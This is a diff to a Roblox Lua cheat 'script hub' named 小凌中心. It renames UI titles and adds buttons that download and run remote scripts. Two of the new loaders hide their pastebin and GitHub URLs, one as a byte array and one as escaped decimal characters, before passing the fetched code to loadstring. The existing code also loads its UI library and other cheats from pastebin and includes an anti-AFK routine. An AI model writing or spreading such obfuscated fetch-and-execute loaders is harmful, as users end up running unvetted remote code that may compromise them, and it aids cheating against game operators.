@@ -16,12 +16,12 @@ game:GetService("StarterGui"):SetCore("SendNotification",{
 local CoreGui = game:GetService("StarterGui")
 
 CoreGui:SetCore("SendNotification", {
-    Title = "◈小凌中心-1.9◈",
+    Title = "◈小凌中心-CW2N1.UI◈",
     Text = "加载GUI中请稍等....(反挂机？启动！)",
     Duration = 5, 
 })
 CoreGui:SetCore("SendNotification", {
-    Title = "加载GUI成功",
+    Title = "GUI成功",
     Text = "正在打开UI",
     Duration = 5, 
 })
@@ -33,7 +33,7 @@ print("反挂机开启成功")
 		   vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
 		end)
 local OrionLib = loadstring(game:HttpGet('https://pastebin.com/raw/SePpsSPZ'))()
-local Window = OrionLib:MakeWindow({Name = "☸1.9-Script-小凌中心☸", HidePremium = false, SaveConfig = true,IntroText = "感谢您执行小凌中心(脚本在公告下面)", ConfigFolder = "你好，我xiaoling啊"})
+local Window = OrionLib:MakeWindow({Name = "CW2N1-NEO.UI!-Script-小凌中心", HidePremium = false, SaveConfig = true,IntroText = "感谢您执行小凌中心(脚本在公告下面)", ConfigFolder = "你好，我xiaoling啊"})
 local about = Window:MakeTab({
     Name = "₪信息",
     Icon = "rbxassetid://4483345998",
@@ -1845,3 +1845,22 @@ Tab:AddButton({
     TUIXUI="作者退休☯︎"JIAOBEN="永久免费缝合"qun="809771141"loadstring(game:HttpGet("https://pastebin.com/raw/yPhwFHy4"))()
   end
 })
+Tab:AddButton({
+  Name = "情云脚本",
+  Callback = function ()
+    loadstring(utf8.char((function() return table.unpack({108,111,97,100,115,116,114,105,110,103,40,103,97,109,101,58,72,116,116,112,71,101,116,40,34,104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,67,104,105,110,97,81,89,47,45,47,109,97,105,110,47,37,69,54,37,56,51,37,56,53,37,69,52,37,66,65,37,57,49,46,108,117,97,34,41,41,40,41})end)()))()
+  end
+})
+Tab:AddButton({
+  Name = "河北唐县",
+  Callback = function ()
+    loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\80\100\84\55\99\65\82\84"))()
+  end
+})
+Tab:AddButton({
+  Name = "The Rake(小云☁)",
+  Callback = function ()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/XiaoYunCN/Cloud-script/main/The%20Rake.lua"))()
+  end
+})
+Tab:AddParagraph("666666小凌是缝合王")
